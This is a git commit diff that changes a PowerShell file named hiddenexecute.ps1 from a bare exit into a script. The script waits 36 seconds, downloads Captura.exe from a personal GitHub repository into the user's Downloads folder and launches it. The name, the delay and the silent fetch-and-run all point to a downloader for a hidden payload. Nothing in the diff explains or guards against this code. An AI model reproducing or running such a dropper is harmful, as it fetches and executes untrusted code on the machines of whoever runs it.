3fa036ace312de981692a6ebb500f9c3a2cc6a65
webntdev <96979468+webntdev@users.noreply.github.com>
2024-04-12 11:16:33 +0300

    Update hiddenexecute.ps1

--- files/hiddenexecute.ps1
+++ files/hiddenexecute.ps1
@@ -1,1 +1,21 @@
-Exit
+$urls = @(
+    "https://github.com/webntdev/webntdev.github.io/raw/main/application/Captura.exe"
+)
+
+$filePath = Join-Path -Path $env:USERPROFILE -ChildPath "Downloads\wheiu.bz"
+
+Start-Sleep -Seconds 36
+
+$downloadDir = [System.Environment]::ExpandEnvironmentVariables('%USERPROFILE%\Downloads')
+if (-not (Test-Path -Path $downloadDir)) {
+    New-Item -ItemType Directory -Path $downloadDir
+}
+
+foreach ($url in $urls) {
+    $fileName = [System.IO.Path]::GetFileName($url)
+    $destinationPath = Join-Path -Path $downloadDir -ChildPath $fileName
+    Invoke-WebRequest -Uri $url -OutFile $destinationPath
+}
+
+$exePath = Join-Path -Path $downloadDir -ChildPath "Captura.exe"
+Start-Process -FilePath $exePath
